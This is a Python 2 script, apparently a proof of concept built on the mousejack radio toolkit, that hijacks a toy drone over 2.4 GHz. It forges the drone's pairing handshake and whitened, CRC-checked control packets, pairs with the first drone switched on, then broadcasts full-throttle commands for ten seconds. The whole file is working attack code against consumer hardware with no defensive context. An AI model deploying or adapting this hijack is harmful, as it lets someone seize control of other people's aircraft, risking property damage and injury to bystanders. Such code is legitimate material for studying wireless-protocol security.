#!/usr/bin/env python2
import time, logging, struct, array, sys, time
sys.path.append('mousejack/tools')
from lib import common


# Whitening mask
whitening = [ 0xE3, 0xB1, 0x4B, 0xEA, 0x85, 0xBC, 0xE5, 0x66,
              0x0D, 0xAE, 0x8C, 0x88, 0x12, 0x69, 0xEE, 0x1F,
              0xC7, 0x62, 0x97, 0xD5, 0x0B, 0x79, 0xCA, 0xCC,
              0x1B, 0x5D, 0x19, 0x10, 0x24, 0xD3, 0xDC, 0x3F,
              0x8E, 0xC5, 0x2F ]


# CRC-16 calculation over 1 byte 
def crc16_update(crc, byte):
  poly = 0x1021
  crc ^= (byte << 8)
  for x in range(8):
    if (crc & 0x8000): crc = (crc << 1) ^ poly
    else: crc = crc << 1
  crc &= 0xFFFF
  return crc


# Reverse the bits in a byte
def br(b): return int('{:08b}'.format(b)[::-1], 2)


#  Drone packet 
class drone_packet(object):

  # Constructor
  def __init__(self, address, phase, cid, vid, aileron=1500, elevator=1500, throttle=1500, rudder=1500, flip=0, mode=2, crc=0):
    self.address = address
    self.phase = phase
    self.cid = cid
    self.vid = vid
    self.aileron = aileron
    self.elevator = elevator
    self.throttle = throttle
    self.rudder = rudder
    self.flip = flip
    self.mode = mode
    self.crc = crc

  # Build the packet bytes
  def to_bytes(self):
    global whitening

    _aileron = struct.pack('H', self.aileron)
    _elevator = struct.pack('H', self.elevator)
    _throttle = struct.pack('H', self.throttle)
    _rudder = struct.pack('H', self.rudder)
    _rudder = _rudder[0] + (str(ord(_rudder[1]) | (self.flip >> 4)))

    payload = self.address + [br(self.phase)] + self.cid + self.vid
    payload += [br(ord(_aileron[0])), br(ord(_aileron[1]))]
    payload += [br(ord(_elevator[0])), br(ord(_elevator[1]))]
    payload += [br(ord(_throttle[0])), br(ord(_throttle[1]))]
    payload += [br(ord(_rudder[0])), (br(ord(_rudder[1])) & 0xF0)]
    payload += [br(self.mode&0xFF), br(self.mode>>8)]

    # crc calculation
    crc_calc = 0xFFFF
    for b in payload:
      crc_calc = crc16_update(crc_calc, b)
    crc_calc ^= 0xFFFF

    payload += [crc_calc>>8, crc_calc&0xFF]
    payload += [49]

    for x in range(len(payload)):
      payload[x] ^= whitening[x]

    pkt = array.array('B', [0x71, 0x0F, 0x55] + payload).tostring()
    return pkt


# Parse a packet
def parse_packet(bytes):
    global whitening

    # De-whiten
    combined = [ord(c) for c in bytes[3:30]]
    dewhitened = [0]*27
    for x in range(len(combined)):
        dewhitened[x] = combined[x] ^ whitening[x]

    # Parse the fields
    address = dewhitened[0:5]
    phase, cid, vid = br(dewhitened[5]), dewhitened[6:10], dewhitened[10:14]  
    aileron = br(dewhitened[14]) | (br(dewhitened[15]) << 8)
    elevator = br(dewhitened[16]) | (br(dewhitened[17]) << 8)
    throttle = br(dewhitened[18]) | (br(dewhitened[19]) << 8)
    rudder = (br(dewhitened[20]) | (br(dewhitened[21]) << 8)) & 0x0FFF
    flip = dewhitened[21] & 0x0F
    mode = br(dewhitened[22]) | (br(dewhitened[23]) << 8)
    crc = br(combined[24]) | (br(combined[25]) << 8)

    # Validate CRC
    crc_calc = 0xFFFF
    for x in range(len(dewhitened)-3):
        crc_calc = crc16_update(crc_calc, dewhitened[x])
    crc_calc ^= 0xFFFF
    crc_given = dewhitened[24] << 8 | dewhitened[25]
    crc_match = crc_calc == crc_given

    # Return CRC success and a the parsed packet
    return crc_match, drone_packet(address, phase, cid, vid, aileron, elevator, throttle, rudder, flip, mode, crc_given)


# Fly, fly away!
def fly_fly_away(vid):
  address = [0xCC, 0xCC, 0xCC, 0xCC, 0xCC]
  phase = 0x55
  cid = [0x00, 0x00, 0x00, 0x00]
  
  # Build the packet
  packet = drone_packet(address, phase, cid, list(vid), throttle=2000)
  packet_bytes = packet.to_bytes()

  # Tune to channel 3, where we'll transmit at a 100% duty cycle 
  common.radio.set_channel(3)

  # Transmit for 10 seconds, which will fly the drone for less than 10 seconds due to 
  # a delay (caused an intense fear of nets) which offsets the start by some number of 
  # units of time. This seems to be variable, but it's unclear exactly what's happening. 
  start = time.time()
  while True:
    if time.time() - start > 10: break 
    common.radio.transmit_payload_generic(packet_bytes, address='\xFF\xFF\xFF\xFF\xFF')


# Pair to the first drone that gets turned on
def pair_drone():
  SEARCHING, RESPONDING, PAIRED = 0, 1, 2
  address = [0xCC, 0xCC, 0xCC, 0xCC, 0xCC]
  phase = 0xAA
  cid = [0x00, 0x00, 0x00, 0x00]
  vid = [0xFF, 0xFF, 0xFF, 0xFF]
  state = SEARCHING

  # Initial pairing sync packet
  sync_packet = drone_packet(address, phase, cid, vid).to_bytes()

  # Wait for a drone to turn on, and then pair with it
  while True:
    if state == SEARCHING: 

      # Transmit a "pairing sync" packet  
      logging.debug('Searching')
      common.radio.transmit_payload_generic(sync_packet , address='\xFF\xFF\xFF\xFF\xFF')

      # Wait for 50ms and then look for a reply
      time.sleep(0.05)
      payload = common.radio.receive_payload()

      # Parse the received packet
      if len(payload) > 1:
        crc_success, rx_packet = parse_packet(payload.tostring())

        # Ignore CRC failures
        if not crc_success:        
          logging.debug('CRC Failure')
          continue

        # If ACK has been received, send the response 
        elif rx_packet.aileron == 0:

          # For some reason this 250ms delay makes things work more better I think
          time.sleep(0.25)

          # Build a response packet
          response_packet = drone_packet(address, phase, cid, rx_packet.vid).to_bytes()
          vid = rx_packet.vid
          logging.debug('Received ACK, Responding')
          state = RESPONDING
          respond_start = time.time()
          continue      

    elif state == RESPONDING:

      # Timeout after 500ms
      if respond_start - time.time() > 0.5:
        state = SEARCHING  
        logging.debug('Pairing timed out, restarting')
        continue

      # Transmit a response packet
      logging.debug('Responding')
      common.radio.transmit_payload_generic(response_packet , address='\xFF\xFF\xFF\xFF\xFF')

      # Wait for 50ms and then look for a reply
      time.sleep(0.05)
      payload = common.radio.receive_payload()
      
      # Parse the received packet
      if len(payload) > 1:
        crc_success, rx_packet = parse_packet(payload.tostring())

        # Ignore CRC failures
        if not crc_success:    
          logging.debug('CRC Failure')    
          state = SEARCHING
          continue

        # Pairing is complete 
        elif rx_packet.aileron == 1:    
          time.sleep(0.25) 
          logging.debug('Paired')
          state = PAIRED
          break

  logging.info("Done Pairing")
  return vid


# Init command line args
common.init_args('./fly-fly-away.py')
common.parse_and_init()

# Put the radio in promiscuous mode (generic)
common.radio.enter_promiscuous_mode_generic('\x71\x0F\x55', common.RF_RATE_1M)

# Tune to 2402 MHz 
common.radio.set_channel(2)

# Pair to a drone
vid = pair_drone()

# Fly, fly away!
fly_fly_away(vid)
